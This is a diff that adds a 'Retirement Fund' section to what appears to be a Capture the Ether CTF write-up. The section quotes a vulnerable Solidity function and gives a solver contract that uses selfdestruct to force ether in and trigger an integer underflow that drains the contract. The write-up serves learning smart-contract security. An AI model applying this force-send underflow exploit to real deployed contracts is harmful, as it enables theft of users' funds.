@@ -232,3 +232,31 @@ const accounts = await ethers.getSigners();
 const [player, friend] = accounts.slice(0, 2);
 ```
 Deploying the contract will net the player with 1000 tokens. The friend account will approve a transfer of 1000 tokens to the player account. The player account will send 501 tokens to the friend account. Then the player account will ``transferFrom`` the friend account an amount of 500. Because the player account is the ``msg.sender``, the transfer account will subtract 500 from the player account. But because the player sent 501 tokens to the friend account, this will cause an underflow.
+
+##### [Retirement Fund](https://capturetheether.com/challenges/math/retirement-fund/)
+This challenge requires that the balance of the contract in order to achieve completion. Only the owner can call the ``withdraw()`` function, but the ``collectPenalty()`` function has a line that can be exploited
+```js
+function collectPenalty() public {
+    require(msg.sender == beneficiary);
+
+    uint256 withdrawn = startBalance - address(this).balance;
+
+    // an early withdrawal occurred
+    require(withdrawn > 0);
+
+    // penalty is what's left
+    msg.sender.transfer(address(this).balance);
+}
+```
+The ``withdrawn`` variable can be exploited with an underflow. In order to cause the underflow, we would need to send ether to this contract so ``startBalance - address(this).balance`` would be negative, causing the underflow. The underflow would meet the ``require(withdrawn > 0)`` conditions. Because this contract doesn't have a recieve or fallback function, we have to use the [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) opcode.  This can be done using a second contract that recieves a small amount of ether when it is deployed. When that contract is destroyed, it will send the small amount of ether to the target contract.
+```js
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.4;
+
+contract RetirementFundSolver {
+    constructor (address payable target) payable {
+        require(msg.value > 0);
+        selfdestruct(target);
+    }
+}
+```
